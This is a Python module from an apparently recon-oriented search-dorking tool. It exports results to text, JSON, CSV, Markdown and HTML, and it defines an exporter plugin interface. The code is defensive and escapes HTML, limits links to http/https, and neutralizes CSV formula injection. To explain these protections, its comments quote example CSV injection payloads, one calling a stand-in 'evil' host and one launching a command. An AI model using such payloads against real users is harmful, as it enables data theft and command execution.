"""
Export search results to txt / json / csv / html.

Also defines BaseExporter, the plugin interface for export destinations
this module doesn't build in (Jira, DefectDojo, GitHub Issues, ...) -- see
plugins.py for how a dropped-in BaseExporter subclass gets discovered and
registered, the same mechanism BaseEngine/BaseNotifier plugins use.
"""

import json
import os
import csv
import html as html_escape
import time
from pathlib import Path
from typing import List, Optional
from urllib.parse import urlparse
from .engines import SearchResult

# Schemes safe to emit as a live href/link. Search-result URLs, titles and
# snippets are all attacker-influenceable (they come from whatever got
# indexed, not from the operator), so anything rendered as a clickable
# link needs the same scheme floor ssrf_guard.py applies to fetches --
# otherwise a crafted "URL" like `javascript:...` or `data:text/html,...`
# in the export's own table would execute in the *operator's* browser the
# moment they open the report, not the target's.
_SAFE_HREF_SCHEMES = {"http", "https"}

# Characters that Excel/LibreOffice/Google Sheets treat as the start of a
# formula when a CSV cell is opened. A crafted title/snippet/URL like
# `=HYPERLINK("http://evil/?"&A1)` or `+cmd|' /C calc'!A0` isn't executed
# by this tool, but would be by whoever opens the exported CSV in a
# spreadsheet app -- the classic "CSV injection" class of bug. Prefixing
# with a single quote is the standard mitigation: every affected app
# treats a leading `'` as "this cell is text", not part of the value.
_CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _safe_href(url: str) -> str:
    """Return `url` as-is if its scheme is safe to place in a live href,
    otherwise "" so callers render the value as plain text instead of a
    clickable link. Only checked when building an href attribute --
    _render_html_report still escapes and displays the raw value as
    visible text regardless, so a blocked scheme is still visible to the
    operator, just not clickable.
    """
    try:
        scheme = urlparse(url).scheme.lower()
    except ValueError:
        return ""
    return url if scheme in _SAFE_HREF_SCHEMES else ""


def _csv_safe(value: str) -> str:
    """Neutralize CSV/formula injection: prefix a leading single quote if
    the cell would otherwise be interpreted as a formula by a spreadsheet
    application. See module-level comment on _CSV_FORMULA_PREFIXES.
    """
    if value and value[0] in _CSV_FORMULA_PREFIXES:
        return "'" + value
    return value


class BaseExporter:
    """Plugin interface for an export destination. Subclass this, set
    `.name`, implement `.export()`, and drop the file in the plugins
    directory (see plugins.py's module docstring) to make it available
    via `--export-via <name>`.

    Unlike export_results() below (which writes a local file in a fixed
    format), a plugin exporter's `.export()` can do anything with the
    results -- push them to an API (create Jira tickets, DefectDojo
    findings, GitHub issues), write a custom format, etc. It still
    returns a string describing where the results ended up (a file path,
    a ticket URL, whatever's meaningful for that destination) so the CLI
    has something to show the user, mirroring export_results()'s return
    value.

    `__init__` receives the full loaded config dict, mirroring
    engines.BaseEngine's constructor -- an exporter reads whatever
    credentials/endpoint it needs from `self.cfg` itself (e.g. a Jira
    plugin might read `cfg.get("jira_api_token")`).
    """
    name = "base"

    def __init__(self, cfg: dict):
        self.cfg = cfg

    def export(self, results: List[SearchResult], title: str = "LX-Dork-Pro Results") -> str:
        raise NotImplementedError


# Populated by plugins.install_plugins_into_registry() at CLI startup;
# empty by default since txt/json/csv/html (below) are built in and don't
# need to be registered here. Keyed by `.name`.
EXPORTER_REGISTRY: dict = {}


SUPPORTED_FORMATS = ("txt", "json", "jsonl", "ndjson", "csv", "md", "html", "htm")


def _result_dict(r: SearchResult) -> dict:
    return {
        "url": r.url, "title": r.title, "snippet": r.snippet, "engine": r.engine,
        "source_query": r.source_query, "also_seen_in": list(r.also_seen_in),
    }


def _write_atomic(p: Path, text: str, newline=None) -> None:
    """Write via a temp file + rename so an interrupted export never leaves a
    half-written (and therefore unparseable) file where the old one was."""
    tmp = p.with_name(p.name + ".tmp")
    with open(tmp, "w", encoding="utf-8", newline=newline) as f:
        f.write(text)
    os.replace(tmp, p)


def _md_cell(value: str) -> str:
    return (value or "").replace("|", "\\|").replace("\n", " ").replace("\r", " ").strip()


def _render_markdown(results: List[SearchResult], title: str) -> str:
    lines = [f"# {title}", "", f"{len(results)} result(s)", "", "| # | URL | Title | Engine(s) |", "|---|-----|-------|-----------|"]
    for i, r in enumerate(results, 1):
        engines = ", ".join([r.engine] + list(r.also_seen_in)) if r.engine else ", ".join(r.also_seen_in)
        url = _md_cell(r.url)
        lines.append(f"| {i} | {url if _safe_href(r.url) else '`' + url + '`'} | {_md_cell(r.title)} | {_md_cell(engines)} |")
    return "\n".join(lines) + "\n"


def export_results(
    results: List[SearchResult], path: str, fmt: Optional[str] = None, title: str = "LX-Dork-Pro Results"
) -> str:
    """Write results to `path`. Format comes from `fmt` or the file extension:
    txt (URLs only, pipe-friendly), json, jsonl/ndjson (one object per line --
    stream-friendly for jq and big runs), csv, md, html. An unrecognized
    extension falls back to txt (the safest pipe-friendly default) -- callers
    wanting to warn about that can check SUPPORTED_FORMATS first."""
    p = Path(path)
    fmt = (fmt or p.suffix.lstrip(".").lower() or "txt").lower()

    if fmt == "json":
        _write_atomic(p, json.dumps([_result_dict(r) for r in results], indent=2))

    elif fmt in ("jsonl", "ndjson"):
        _write_atomic(p, "".join(json.dumps(_result_dict(r)) + "\n" for r in results))

    elif fmt == "csv":
        import io
        buf = io.StringIO()
        writer = csv.writer(buf)
        # Column layout is a stable contract (spreadsheets / positional parsers):
        # richer fields live in the json/jsonl exports, which are read by key.
        writer.writerow(["url", "title", "snippet", "engine"])
        for r in results:
            writer.writerow([_csv_safe(r.url), _csv_safe(r.title), _csv_safe(r.snippet), _csv_safe(r.engine)])
        _write_atomic(p, buf.getvalue(), newline="")

    elif fmt == "md":
        _write_atomic(p, _render_markdown(results, title))

    elif fmt in ("html", "htm"):
        _write_atomic(p, _render_html_report(results, title))

    else:  # plain txt -- just URLs, one per line (pipe-friendly for other recon tools)
        _write_atomic(p, "\n".join(r.url for r in results) + "\n")

    return str(p.resolve())


def export_via_plugin(name: str, cfg: dict, results: List[SearchResult], title: str = "LX-Dork-Pro Results"):
    """Dispatch an export through a registered BaseExporter plugin by
    name. Returns (destination, error): destination is the plugin's
    description of where the results ended up (a ticket URL, etc.) on
    success, or None on failure; error is None on success or a message
    string on failure -- never raises, so callers can check `error`
    truthiness the same way notify.notify_via_plugin's callers do.
    """
    exporter_cls = EXPORTER_REGISTRY.get(name)
    if exporter_cls is None:
        return None, f"No exporter plugin named '{name}' is registered. Run `lxdorkpro plugins` to see what's loaded."

    try:
        exporter = exporter_cls(cfg)
        destination = exporter.export(results, title)
        return destination, None
    except Exception as e:  # noqa: BLE001 -- a broken plugin must not crash the scan
        return None, f"Exporter plugin '{name}' raised an unexpected error: {type(e).__name__}: {e}"


_ENGINE_BADGE_COLORS = {
    "google": "#34a853",
    "bing": "#0078d4",
    "brave": "#fb542b",
    "searxng": "#9b59b6",
    "duckduckgo": "#de5833",
    "google-scrape": "#7cb342",
    "yandex": "#ff0000",
    "mojeek": "#0060df",
    "startpage": "#9c27b0",
    "wayback": "#8d6e63",
    "commoncrawl": "#ff8f00",
    "crtsh": "#c2185b",
    "urlscan": "#00acc1",
}


def _render_html_report(results: List[SearchResult], title: str) -> str:
    e = html_escape.escape
    generated = time.strftime("%Y-%m-%d %H:%M:%S")

    rows = []
    for r in results:
        color = _ENGINE_BADGE_COLORS.get(r.engine, "#607d8b")
        href = _safe_href(r.url)
        # A URL with a scheme we won't put in a live href (javascript:,
        # data:, etc.) is still shown, escaped, as plain text -- just not
        # clickable. The operator can still see and copy it; it just
        # can't execute in their browser when they open this report.
        url_cell = (
            f'<a href="{e(href)}" target="_blank" rel="noopener noreferrer">{e(r.url)}</a>'
            if href else e(r.url)
        )
        rows.append(
            f"""
            <tr>
              <td><span class="badge" style="background:{color}">{e(r.engine)}</span></td>
              <td>{url_cell}</td>
              <td>{e(r.title or '-')}</td>
            </tr>"""
        )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{e(title)}</title>
<style>
  :root {{
    --bg: #0d1117; --panel: #161b22; --border: #30363d;
    --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff;
  }}
  * {{ box-sizing: border-box; }}
  body {{
    background: var(--bg); color: var(--text); margin: 0; padding: 2rem;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }}
  .header {{ margin-bottom: 1.5rem; }}
  .header h1 {{ margin: 0 0 0.25rem 0; font-size: 1.5rem; color: #fff; }}
  .header .meta {{ color: var(--muted); font-size: 0.9rem; }}
  .stats {{
    display: flex; gap: 1rem; margin: 1rem 0 1.5rem 0; flex-wrap: wrap;
  }}
  .stat-box {{
    background: var(--panel); border: 1px solid var(--border); border-radius: 8px;
    padding: 0.75rem 1.25rem;
  }}
  .stat-box .num {{ font-size: 1.4rem; font-weight: 700; color: var(--accent); }}
  .stat-box .label {{ font-size: 0.8rem; color: var(--muted); }}
  table {{
    width: 100%; border-collapse: collapse; background: var(--panel);
    border: 1px solid var(--border); border-radius: 8px; overflow: hidden;
  }}
  th {{
    text-align: left; padding: 0.75rem 1rem; background: #1c2128;
    color: var(--muted); font-size: 0.8rem; text-transform: uppercase;
    letter-spacing: 0.05em; border-bottom: 1px solid var(--border);
  }}
  td {{
    padding: 0.65rem 1rem; border-bottom: 1px solid var(--border); font-size: 0.9rem;
    word-break: break-all;
  }}
  tr:last-child td {{ border-bottom: none; }}
  tr:hover {{ background: rgba(88, 166, 255, 0.06); }}
  a {{ color: var(--accent); text-decoration: none; }}
  a:hover {{ text-decoration: underline; }}
  .badge {{
    display: inline-block; padding: 0.15rem 0.55rem; border-radius: 999px;
    font-size: 0.72rem; font-weight: 600; color: #fff; white-space: nowrap;
  }}
  footer {{ margin-top: 1.5rem; color: var(--muted); font-size: 0.8rem; text-align: center; }}
</style>
</head>
<body>
  <div class="header">
    <h1>{e(title)}</h1>
    <div class="meta">Generated by LX-Dork-Pro &middot; {generated}</div>
  </div>

  <div class="stats">
    <div class="stat-box"><div class="num">{len(results)}</div><div class="label">Unique URLs</div></div>
  </div>

  <table>
    <thead>
      <tr><th>Engine</th><th>URL</th><th>Title</th></tr>
    </thead>
    <tbody>
      {"".join(rows) if rows else '<tr><td colspan="3">No results</td></tr>'}
    </tbody>
  </table>

  <footer>LX-Dork-Pro &mdash; recon results are for authorized testing only.</footer>
</body>
</html>
"""
